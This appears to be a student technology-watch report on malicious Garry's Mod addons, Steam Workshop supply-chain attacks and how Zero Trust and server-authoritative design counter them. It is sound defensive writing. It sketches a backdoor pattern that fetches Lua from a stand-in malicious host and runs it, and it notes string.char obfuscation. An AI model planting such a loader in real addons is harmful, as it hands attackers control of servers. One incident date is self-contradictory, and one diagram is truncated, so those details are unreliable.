## 1. Introduction

### 1.1 Context

The gaming industry generates over $180 billion annually, with multiplayer games relying on complex architectures where clients and servers exchange data continuously. A critical yet often overlooked aspect of this ecosystem is the **security of third-party addons** — community-created extensions that enhance gameplay but can also introduce severe vulnerabilities.

Platforms like the **Steam Workshop** allow anyone to publish addons downloaded by millions of players and thousands of server administrators. This creates a **supply chain** where a single compromised addon can affect an entire ecosystem. In games like Garry's Mod, where addons execute Lua code with significant system access, this risk is particularly acute.

### 1.2 Problem Statement

**How can multiplayer game servers protect themselves against malicious addons, and how do Zero Trust principles translate into game architecture to ensure that neither clients nor third-party code can compromise server integrity?**

This report investigates:
- The real-world threat of addon backdoors and supply chain attacks in gaming
- How Zero Trust Architecture (ZTA), as defined by NIST SP 800-207, applies to game server design
- The server-authoritative model as the practical implementation of Zero Trust in gaming
- Concrete security measures from a real-world project (RP Construction System for Garry's Mod)

### 1.3 Scope

This technology watch focuses on:
- **Garry's Mod** as a primary case study (Lua-based addon ecosystem)
- **Steam Workshop** as a distribution platform and attack vector
- **NIST Zero Trust Architecture** (SP 800-207) as a theoretical framework
- **Server-authoritative architecture** as the practical defense mechanism
- **Docker containerization** as an infrastructure security layer

## 3. The Threat Landscape: Addon Backdoors and Supply Chain Attacks

### 3.1 What is a Game Addon Backdoor?

A **backdoor** in a game addon is malicious code hidden within seemingly legitimate functionality. In Garry's Mod, backdoors typically exploit the Lua scripting engine to:

1. **Execute arbitrary code remotely** — The addon contacts an external server and runs whatever code it receives
2. **Grant unauthorized access** — Create hidden superadmin accounts or RCON access
3. **Exfiltrate data** — Steal server configurations, player information, or credentials
4. **Establish persistence** — Survive server restarts by writing to configuration files

### 3.2 Anatomy of a GMod Backdoor

The most common pattern, as documented by the security community (Stack Overflow, 2022; Backdoor Shield, 2020), follows this structure:

```
┌─────────────────────────────────────────────────┐
│  ADDON CODE (appears legitimate)                │
│                                                  │
│  1. Obfuscated loader                           │
│     → string.char() encoding                     │
│     → Base64 or custom encoding                  │
│     → Variable name randomization                │
│                                                  │
│  2. Remote code execution                        │
│     → http.Fetch("https://malicious.com/run.lua")│
│     → RunString(response)                        │
│                                                  │
│  3. Persistence mechanism                        │
│     → Write to autorun files                     │
│     → Hook into server startup                   │
│     → Self-replicating across addons             │
│                                                  │
│  4. Payload (received remotely)                  │
│     → CreateConVar for hidden RCON               │
│     → File system access                         │
│     → Player data harvesting                     │
│     → DDoS relay                                 │
└─────────────────────────────────────────────────┘
```

**Real-world example — KVacDoor** (documented on Stack Overflow, 2022):

This widespread backdoor was embedded in popular GMod addons. When loaded, it:
1. Contacted `kvac.cz` via HTTP
2. Downloaded and executed arbitrary Lua code
3. Allowed the attacker to run console commands on the server
4. Could access and modify server files

The backdoor was obfuscated using `string.char()` encoding to evade detection by simple text searches.

### 3.3 The Steam Workshop as a Supply Chain Attack Vector

The Steam Workshop creates a **supply chain** analogous to npm or PyPI in software development:

```
Developer → Workshop Upload → Auto-Update → Server Downloads → Execution
                                    ↑
                              ATTACK SURFACE
```

| Attack Vector | Description | Real-world Example |
|--------------|-------------|-------------------|
| **Malicious upload** | Attacker publishes a new addon with hidden backdoor | Common; detected by tools like Backdoor Shield |
| **Account compromise** | Legitimate developer's account is hijacked; malware pushed as "update" | Downfall mod incident (December 2023) — gHacks |
| **Delayed payload** | Addon is clean initially, malicious update pushed later | KVacDoor pattern — initially useful addon |
| **Dependency confusion** | Addon requires another addon that is compromised | Less common in GMod but documented |
| **Auto-update exploitation** | Workshop auto-downloads updates without review | will.io (2014): "Auto-updating is bad news" |

**The People Playground Incident (2025):**
In February 2026, the game People Playground had to **disable its entire Steam Workshop** after a malicious mod was uploaded that deleted competing mods and save files (NotebookCheck, 2025). This demonstrates that the threat is current and ongoing.

### 3.4 Scale of the Problem

| Statistic | Value | Source |
|-----------|-------|--------|
| Active GMod Workshop addons | ~500,000+ | Steam Workshop |
| Known GMod backdoor families | 10+ (KVacDoor, Omega, BuriedSelfEsteem, etc.) | Backdoor Shield GitHub |
| Servers affected by GMod backdoors | Thousands (estimated) | Community reports |
| Detection tools available | 3 major (Backdoor Shield, CPE, SNTE) | Steam Workshop |
| People Playground users affected | ~50 (before takedown) | Steam Community |

### 3.5 Why Traditional Security Fails

Traditional perimeter-based security assumes that code **inside the server** is trusted. This assumption fails because:

1. **Addons ARE inside the perimeter** — Once installed, they execute with full Lua privileges
2. **Auto-updates bypass review** — Workshop updates deploy automatically
3. **Obfuscation defeats scanning** — `string.char()`, Base64, and custom encoders make static analysis difficult
4. **Trust is transitive** — If you trust addon A, and addon A loads code from URL B, you implicitly trust B

This is precisely the problem that **Zero Trust Architecture** is designed to solve.

---

## 4. Zero Trust Principles Applied to Game Architecture

### 4.1 NIST SP 800-207: Zero Trust Architecture

The National Institute of Standards and Technology defines Zero Trust Architecture (NIST, 2020) around seven core tenets:

| NIST Tenet | Standard Definition | Game Server Application |
|------------|-------------------|------------------------|
| **1. All data sources and computing services are considered resources** | Every asset is a resource to protect | Every entity, prop, and player state is a server resource |
| **2. All communication is secured regardless of network location** | No implicit trust from being "inside" | Client messages are validated even from authenticated players |
| **3. Access to individual resources is granted on a per-session basis** | No persistent trust | Each net message is independently validated |
| **4. Access is determined by dynamic policy** | Context-aware decisions | Job role, cooldowns, rate limits, ownership all checked per-action |
| **5. The enterprise monitors and measures the integrity of all assets** | Continuous monitoring | Rate limiting, logging, anomaly detection |
| **6. All resource authentication and authorization are dynamic** | No static credentials | Player permissions re-evaluated each action |
| **7. The enterprise collects information about the current state of assets** | Asset awareness | Server tracks entity ownership, player state, active sessions |

### 4.2 Mapping Zero Trust to Game Architecture

```
NIST Zero Trust                    Game Server Zero Trust
┌──────────────┐                  ┌──────────────────────────┐
│ Policy Engine │ ←───────────→   │ Server-side validation   │
│              │                  │ (permissions, rate limit) │
└──────┬───────┘                  └──────────┬───────────────┘
       │                                      │
┌──────┴───────┐                  ┌──────────┴───────────────┐
│ Policy       │ ←───────────→   │ Role-based access control │
│ Administrator│                  │ (job system, ownership)   │
└──────┬───────┘                  └──────────┬───────────────┘
       │                                      │
┌──────┴───────┐                  ┌──────────┴───────────────┐
│ Policy       │ ←───────────→   │ Net message validation   │
│ Enforcement  │                  │ (input sanitization)      │
│ Point        │                  │                           │
└──────────────┘                  └───────────────────────────┘
```

### 4.3 The Fundamental Rule: Never Trust the Client

In game development, this principle is expressed as: **"The client is in the hands of the enemy"** (Gabriel Gambetta, "Client-Server Game Architecture").

| What the client says | What the server must verify |
|---------------------|---------------------------|
| "I want to select this prop" | Is the prop valid? Does the player own it? Is the player the right job? Rate limit OK? |
| "Here's my blueprint data" | Are all entity classes allowed? Is the prop count within limits? Are positions valid? |
| "Materialize this ghost" | Does the ghost exist? Does the player have an active crate? Does the crate have materials? |
| "Load this crate onto a vehicle" | Is the vehicle valid? Is the crate nearby? Is there cargo space? |

Every single message from the client must be treated as **potentially malicious** — even from authenticated, legitimate players.

---

## 5. Server-Authoritative Design: The Only Real Defense

### 5.1 Architecture Comparison

| Architecture | Trust Model | Security | Latency | Complexity |
|-------------|------------|----------|---------|------------|
| **Client-authoritative** | Client controls game state | ❌ Trivially hackable | Low | Low |
| **Client-predictive** | Client predicts, server corrects | ⚠️ Better but exploitable | Medium | High |
| **Server-authoritative** | Server owns all state | ✅ Strongest | Higher | Medium |
| **Deterministic lockstep** | All clients simulate identically | ⚠️ Requires identical inputs | Low | Very high |

### 5.2 Server-Authoritative in Practice

The server-authoritative model implements Zero Trust by design:

```
CLIENT                          SERVER
  │                               │
  ├── "Select prop #42" ────────→ │
  │                               ├── IsValid(prop)?
  │                               ├── IsOwner(player, prop)?
  │                               ├── IsAllowedJob(player)?
  │                               ├── RateLimit(player)?
  │                               ├── ✅ All checks pass
  │ ←── "Selection confirmed" ────┤
  │                               │
  ├── "Save blueprint" ─────────→ │
  │                               ├── Cooldown check
  │                               ├── Serialize on SERVER
  │                               ├── Validate all classes
  │                               ├── Check blacklist
  │                               ├── ✅ Data is clean
  │ ←── "Here's the safe data" ───┤
  │                               │
  │   (Client saves locally)      │
```

Key principle: **the server serializes the data, not the client**. The client never sends blueprint data to the server — it requests the server to read the props and create the blueprint. This prevents injection of malicious entity classes.

### 5.3 Defense in Depth Layers

```

├── Non-privileged containers
└── Automated backups with integrity checks

Layer 5: Monitoring Level
├── Console logging of all actions

├── Rate limit violation alerts
└── Admin commands for investigation
```

### 5.4 Comparison with Industry Standards

| Game/Platform | Architecture | Anti-Cheat Approach | Zero Trust Level |
|---------------|-------------|-------------------|-----------------|
| **Garry's Mod (vanilla)** | Mixed (addon-dependent) | None built-in | ❌ Low |
| **Counter-Strike 2** | Server-authoritative | VAC + kernel-level | ⚠️ Medium (trusts VAC) |
| **Fortnite** | Server-authoritative | EasyAntiCheat | ⚠️ Medium |
| **Minecraft (Paper)** | Server-authoritative | Plugin-based | Depends on config |
| **Our project (RP Construction System)** | Fully server-authoritative | Built-in validation | ✅ High (for its scope) |

---

## 6. Case Study: Applying Zero Trust to the RP Construction System

### 6.1 Project Context

The RP Construction System is a Garry's Mod addon developed as part of a Cybersecurity B3 capstone project. It runs on a containerized infrastructure (Docker) with a MySQL database, and is published on the Steam Workshop.

### 6.2 Zero Trust Implementation

| NIST Tenet | Implementation in Project |
|------------|--------------------------|
| **Resources** | Every ghost, crate, and prop is a tracked server entity |
| **Secured communication** | 18 net messages, all validated server-side |
| **Per-session access** | Each action independently verified (no cached trust) |
| **Dynamic policy** | Job role, cooldowns, rate limits checked per-request |
| **Monitoring** | Console logs + MySQL audit trail |
| **Dynamic auth** | CPPI ownership re-checked each interaction |
| **Asset awareness** | Server tracks all entities, selections, and player states |

### 6.3 Specific Security Measures Against Addon Threats

| Threat | How Our Addon Prevents It |
|--------|--------------------------|
| **Backdoor via RunString** | No `RunString` or `CompileString` used anywhere in the codebase |
| **Remote code execution** | No `http.Fetch` to external servers for code execution |
| **Entity injection** | Strict `AllowedClasses` whitelist + `BlacklistedEntities` pattern matching |
| **Net message flooding** | Global rate limit (60/min) + per-action cooldowns |
| **SQL injection** | 100% prepared statements via MySQLOO |
| **Privilege escalation** | SuperAdmin-only admin commands, job-based SWEP access |
| **Data exfiltration** | Blueprints stored client-side only; no sensitive data on server |

### 6.4 Infrastructure Security (Docker)

The Docker containerization adds an additional Zero Trust layer:

| Measure | Effect |
|---------|--------|
| Container isolation | GMod process cannot access host filesystem |
| Resource limits (3 GB RAM, 2 CPU) | Prevents resource exhaustion attacks |
| No `--privileged` flag | Prevents container escape |
| Internal Docker network for MySQL | Database not exposed to Internet |
| Bind mounts (read-only where possible) | Minimizes attack surface |

---

## 7. Analysis and Hypotheses

### 7.1 Hypothesis 1: Most game server compromises come from trusted addons, not external attacks

**Evidence:**
- The majority of documented GMod server breaches involve backdoored addons, not network-level attacks (will.io, 2014; Backdoor Shield, 2020)
- The People Playground Workshop incident (2025) shows this remains a current threat
- Supply chain attacks are the fastest-growing attack vector in software generally (Sonatype, 2023)

**Conclusion:** Server administrators should prioritize **addon auditing** over network hardening. While firewalls are important, the primary attack surface is the code running inside the server.

### 7.2 Hypothesis 2: Zero Trust client architecture is more effective than client-side anti-cheat

**Evidence:**
- Client-side anti-cheat (VAC, EAC, BattlEye) can be bypassed (documented extensively)
- Server-authoritative validation cannot be bypassed without exploiting the server itself
- NIST SP 800-207 explicitly states that network location should not grant implicit trust

**Conclusion:** For game servers, **server-side validation is the definitive defense**. Client-side anti-cheat is a complementary measure, not a substitute.

### 7.3 Hypothesis 3: Containerization significantly reduces the blast radius of addon compromises

**Evidence:**
- Docker containers provide process isolation at the kernel level
- Resource limits prevent denial-of-service from within the container
- A compromised GMod addon in a container cannot access the host system or other containers

**Conclusion:** Running game servers in containers with strict resource limits and network policies is a **best practice** that should be standard, not optional.

### 7.4 Comparative Scenario Analysis — C30

| Scenario | Without Zero Trust | With Zero Trust |
|----------|-------------------|-----------------|
| **Backdoored addon installed** | Full server compromise, data exfiltration | Addon blocked by whitelist/blacklist or contained by container |
| **Client sends malicious data** | Server accepts, spawns illegal entities | Server rejects, logs violation, player warned |
| **Net message flood** | Server crashes or becomes unresponsive | Rate limiter blocks excess, server stays stable |
| **SQL injection attempt** | Database compromised | Prepared statements prevent injection |
| **Workshop update with malware** | Auto-deployed, server compromised | Manual review before deployment recommended |

---

## 8. Dissemination Strategy — C31

### 8.1 Target Audience

| Audience | Knowledge Level | Preferred Format | Frequency |
|----------|----------------|-----------------|-----------|
| **Development team** | High (technical) | Technical wiki + code reviews | Weekly |
| **Server administrators** | Medium | Best practices guide + checklist | Monthly |
| **Gaming community** | Low-Medium | Blog posts, Steam guides | Quarterly |
| **Management / Jury** | Non-technical | Executive summary + presentation | On demand |

### 8.2 Dissemination Tools

| Tool | Purpose | Audience |
|------|---------|----------|
| **GitHub Wiki** | Technical documentation, security guidelines | Development team |
| **Steam Workshop Guide** | Server admin security checklist | Server administrators |
| **Discord / Community forums** | Alerts on new vulnerabilities, discussion | Gaming community |
| **Notion / Confluence** | Knowledge base, structured watch results | Internal team |
| **Email digest** | Monthly security bulletin | All stakeholders |

### 8.3 Recommended Dissemination Frequency

| Content Type | Frequency | Channel |
|-------------|-----------|---------|
| **Critical vulnerability alerts** | Immediate | Discord + Email |
| **New backdoor family detected** | Within 48h | GitHub Wiki + Discord |
| **Monthly security digest** | Monthly | Email + Notion |
| **Quarterly technology watch report** | Quarterly | Full report (like this one) |
| **Best practices updates** | As needed | GitHub Wiki |

### 8.4 Integration with Project Workflow

```
Discovery → Analysis → Documentation → Review → Dissemination → Action
    ↑                                                              │
    └──────────────── Feedback Loop ──────────────────────────────┘
```

Each finding from the technology watch is:
1. **Documented** in the knowledge base with source and date
2. **Analyzed** for relevance to the current project
3. **Rated** by severity (Critical / High / Medium / Low)
4. **Disseminated** to the appropriate audience via the appropriate channel
5. **Actioned** if a concrete improvement is identified

---

## 9. Conclusion and Recommendations

### 9.1 Key Findings

1. **Addon backdoors are a real, persistent, and growing threat** in the gaming ecosystem. The Steam Workshop, while convenient, creates a supply chain that is difficult to audit.

2. **Zero Trust Architecture, as defined by NIST SP 800-207, maps directly onto game server security.** The core principle — "never trust, always verify" — is equivalent to the game development maxim "the client is in the hands of the enemy."

3. **Server-authoritative design is the practical implementation of Zero Trust in gaming.** It is the only architecture that guarantees server integrity regardless of client behavior.

4. **Containerization provides an essential additional security layer** by limiting the blast radius of any compromise.

5. **The RP Construction System project demonstrates that Zero Trust can be implemented in a real addon** without sacrificing functionality or user experience.
